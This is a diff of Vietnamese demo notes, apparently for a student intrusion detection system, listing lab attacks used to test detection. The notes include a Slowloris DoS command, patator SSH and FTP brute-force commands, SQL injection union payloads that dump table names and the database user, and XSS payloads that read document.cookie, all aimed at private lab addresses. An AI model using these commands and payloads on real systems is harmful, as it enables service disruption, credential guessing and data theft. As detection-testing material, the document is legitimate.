@@ -1,22 +1,31 @@
-***1.Tấn công dos
+- demo giao diện
+1. thống kê
+2. quản lý flow: chi tiết flow -> mô hình bert
+3. theo dõi máy : bật- tắt
+4. danh sách alert: chi tiết rule
+5. quản lý rule: thêm, sửa, xóa
+6. theo dõi flow: xem ngưỡng
+7. quản lý file: chi tiết file và check file
+==============================================================
+***1.Tấn công dos (RF - bert)
 - sudo python3 /home/kali/Desktop/Slowloris/slowloris/slowloris.py 192.168.189.133 -s 500 -p 80
 - lọc theo port đích 80 
 
-***2. port scan 
+***2. port scan (RF - bert)
 - sudo python /home/kali/Desktop/script_data/portscan_new.py
 
-***3. bruce force
+***3. bruce force (RF - bert)
 - sudo patator ssh_login user=william password=FILE0 0=/home/kali/Desktop/Brute-force-SSH-service/passwords.txt host=192.168.189.133 -x ignore:fgrep='Access denied for user'
 - lọc theo port đích 22
 
-***4. FTP bruce force
+***4. FTP bruce force (RF - ngưỡng)
 - sudo patator ftp_login user=william password=FILE0 0=/home/kali/Desktop/Brute-force-SSH-service/passwords.txt host=192.168.189.133 -x ignore:fgrep='Access denied for user'
 - lọc theo port đích 21 
 
-***5 . truy cập internet
+***5 . truy cập internet  (RF - bert)
 - lọc port đích 443
 
-*** 6. sql injection
+*** 6. sql injection  (RF - bert - alert)
 - 6.1 get search
 	- lam' union select 1, (select GROUP_CONCAT(table_name,'\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #
 	- lam' union select 1,user(), database(),4,5,6,7 #
@@ -25,7 +34,7 @@
 - alert
 -lọc theo port đích 8080
 
-*** 7. XSS
+*** 7. XSS  (RF - bert - alert)
 - 7.1 XSS get
 	- <script>alert(document.cookie)</script>
 	- <img src=\"#\" onmouseover=\"alert('XSS via onmouseover')\">
@@ -33,7 +42,7 @@
 	- "\"}]}';alert(document.cookie)</script>"
 - alert
  -lọc theo port đích 8080
-***8. tải file
+***8. tải file  (check file + alert)
 - http://192.168.189.135/downloads/demo.exe
 - http://192.168.189.135/downloads/yourfile.txt
 - alert
